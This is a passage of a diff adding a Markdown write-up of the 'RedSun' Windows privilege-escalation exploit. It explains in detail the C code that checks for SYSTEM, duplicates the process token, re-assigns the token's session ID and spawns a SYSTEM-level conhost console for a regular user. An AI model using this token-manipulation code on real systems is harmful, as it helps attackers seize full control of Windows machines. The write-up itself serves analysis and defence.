+    bool ret = IsWellKnownSid(tokenuser->User.Sid, WinLocalSystemSid);
+    if (ret) {
+        LaunchConsoleInSessionId();
+        ExitProcess(0);
+    }
+    return ret;
+```
+Finally, `IsWellKnownSid` is used to compare the SID of the retrieved user information to that of the SYSTEM SID. If they match, `LaunchConsoleInSessionId()` is called.
+
+## LaunchConsoleInSessionId()
+The goal of this function is to run an interactive console with SYSTEM privileges. Normally code run as SYSTEM is in session 0, which is an isolated and non-interactive session; obviously that doesn't make for a very good interactive session. The solution is to create a SYSTEM token (technically a duplicate) and stick the user's current session ID onto it, making it accessible.
+
+```c
+    HANDLE hpipe = CreateFile(L"\\??\\pipe\\REDSUN", GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hpipe == INVALID_HANDLE_VALUE)
+        return;
+	
+	DWORD sessionid = 0;
+    if (!GetNamedPipeServerSessionId(hpipe, &sessionid))
+        return;
+    CloseHandle(hpipe);
+```
+First, a handle is created to an existing file path, specifically to the named pipe created earlier. The session ID of the pipe server is retrieved (representing the user that ran the exploit), then the connection is closed.
+
+```c
+    HANDLE htoken = NULL;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &htoken))
+        return;
+	
+	HANDLE hnewtoken = NULL;
+    bool res = DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &hnewtoken);
+    CloseHandle(htoken);
+    if (!res)
+        return;
+```
+Next a handle is opened to the current process with all permissions, which is then duplicated to `hnewtoken`. The original is closed. Note that a token actively being used by a process can't be modified, hence why a duplicate was made.
+
+```c
+    res = SetTokenInformation(hnewtoken, TokenSessionId, &sessionid, sizeof(DWORD));
+    if (!res)
+    {
+        CloseHandle(hnewtoken);
+        return;
+    }
+```
+The newly duplicated token is then set to have the session ID of the originally opened named pipe, ensuring it will be accessible by the user.
+
+```c
+    STARTUPINFO si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
+    CreateProcessAsUser(hnewtoken, L"C:\\Windows\\System32\\conhost.exe", NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
+	
+    CloseHandle(hnewtoken);
+	
+    if (pi.hProcess)
+        CloseHandle(pi.hProcess);
+    if (pi.hThread)
+        CloseHandle(pi.hThread);
+    return;
+```
+Finally, an instance of `conhost.exe` is created under the session ID of the user, resulting in a SYSTEM-level console accessible to the regular user.
+
+
+## Resources
+- https://github.com/Nightmare-Eclipse/RedSun
+- https://www.huntress.com/blog/nightmare-eclipse-intrusion
+- https://www.cloudsek.com/blog/redsun-windows-0day-when-defender-becomes-the-attacker
+- https://x.com/haider_kabibo/status/2045976684692656245
